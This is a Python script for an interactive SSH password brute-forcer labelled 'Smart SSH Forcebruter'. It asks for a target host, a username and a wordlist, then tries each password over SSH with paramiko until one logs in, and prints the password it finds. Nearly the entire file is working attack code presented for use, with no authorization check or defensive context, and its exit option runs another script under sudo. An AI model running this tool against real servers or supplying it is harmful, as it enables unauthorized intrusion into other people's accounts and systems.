import ftplib
import socketserver
import socket
import paramiko
import time
import os 
import sys
import requests

COLORS = {\
"black":"\u001b[30;1m",
"red": "\u001b[31;1m",
"green":"\u001b[32m",
"yellow":"\u001b[33;1m",
"blue":"\u001b[34;1m",
"magenta":"\u001b[35m",
"cyan": "\u001b[36m",
"white":"\u001b[37m",
"yellow-background":"\u001b[43m",
"black-background":"\u001b[40m",
"cyan-background":"\u001b[46;1m",
}

def colorText(text):
    for color in COLORS:
        text = text.replace("[[" + color + "]]", COLORS[color])
    return text

url = "http://www.google.com" #Je définit l'url de test
timeout = 5 # Timeout de 5 secondes 

#Puis le test d'une requête sur l'url
try:
    request = requests.get(url, timeout=timeout)
    print(colorText("[[green]]\n\n[+] Internet : [CONNECTED]\n"))
    print(colorText("[[red]][!] This script must be run on full screen for optimal use. ! "))
    print(colorText("[[red]][!] This script must be run on full screen for optimal use. ! "))
    time.sleep(3)
    os.system('clear')
except (requests.ConnectionError, requests.Timeout) as exception:
    print(colorText('                 [-][[red]]Internet [NOT CONNECTED] '))
    print(colorText('    [[green]] ✘ [[red]] You must be connected to internet to start this script [[green]] ✘'))
    time.sleep(5)
    sys.exit()

def hostname() : 
    global server
    server = input(colorText('\n[ ? ] Hostname / Ip Adress : '))
    if '.' in server :
        pass
    else : 
        print(colorText('\n[[blue]][-] Wrong Format !'))
        hostname()
    print(colorText("[[green]]\nHostname has been set to : "), server)
    correct = input(colorText("[[yellow]]\n[ ? ] Is it right ? [y/n] "))
    if correct == 'y' : 
        print("")
    else : 
        hostname()
    
def user():
    global username
    username = input(colorText("\n[[yellow]][ ? ] Username : "))
    print(colorText("[[green]]\n[+] Username has been set to : "), username)
    correct = input(colorText("\n[[yellow]][ ? ] Is it right ? [y/n] "))
    if correct == 'y' : 
        pass
    else : 
        user()

def passwordd() : 
    global wordlist
    wordlist = input(colorText("\n[[magenta]][ ? ] Wordlist (ex wordlist.txt) : "))
    if '.txt' in wordlist : 
        pass
    else : 
        print(colorText("\n[[red]][-] Wrong format ! "))
        passwordd()
    print(colorText("\n[[green]][+] Wordlist has been set to : "), wordlist)
    correct = input(colorText("\n[[yellow]][ ? ] Is it right ? [y/n] "))
    if correct == 'y' :
        pass
    else : 
        passwordd()


def parameters():
    hostname()
    user()
    passwordd()


def banner() :  
    d = open('sshbanner.txt', "r")
    ascii = "".join(d.readlines())
    print(colorText(ascii))

def hub() : 
    banner()
    hubchoice = input(colorText("[[red]]\n[ 1 ] Smart SSH Forcebruter\n[ 2 ] Exit\n\n[ ? ] Choice : "))
    try : 
        val = int(hubchoice)
    except ValueError : 
        print(colorText("\n[[red]][-] Invalid choice ! "))
        hub()
    if val >= 3 : 
        print(colorText("\n[[red]][-] Invalid choice ! "))
        hub()
    if val == 1 : 
        parameters()
    elif val == 2 : 
        os.system('sudo python3 smartool.py')


def is_correct(password) :
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(colorText("\n[[red]][!] Trying "), password)
    try :
        ssh.connect(server, port=22, username=username, password=password)
    except paramiko.AuthenticationException : 
        return False
    else : 
        print(colorText('\n[[green]]Successfuly connected'))
        print(colorText("\n[[green]]The password was : "), password)
        return True

hub()


passwords = open(wordlist).read().split("\n")
passwordlenght = len(passwords)

for password in passwords : 
    if is_correct(password) : 
        break 
